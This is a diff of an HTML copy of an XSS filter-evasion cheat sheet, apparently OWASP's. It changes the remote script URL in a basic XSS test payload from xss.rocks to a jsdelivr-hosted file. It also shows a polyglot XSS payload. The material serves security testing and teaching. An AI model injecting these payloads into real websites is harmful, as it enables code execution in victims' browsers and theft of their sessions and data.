@@ -3279,7 +3279,7 @@
 <p>This cheat sheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defense for XSS which these tests can be used to illustrate.</p>
 <h3 id="basic-xss-test-without-filter-evasion">Basic XSS Test Without Filter Evasion<a class="headerlink" href="#basic-xss-test-without-filter-evasion" title="Permanent link">&para;</a></h3>
 <p>This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):</p>
-<p><code>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;</code></p>
+<p><code>&lt;SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js&gt;&lt;/SCRIPT&gt;</code></p>
 <h3 id="xss-locator-polygot">XSS Locator (Polygot)<a class="headerlink" href="#xss-locator-polygot" title="Permanent link">&para;</a></h3>
 <p>The following is a "polygot test XSS payload." This test will execute in multiple contexts including html, script string, js and URL. Thank you to <a href="https://twitter.com/garethheyes">Gareth Heyes</a> for this <a href="https://twitter.com/garethheyes/status/997466212190781445">contribution</a>.</p>
 <p><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;</code></p>
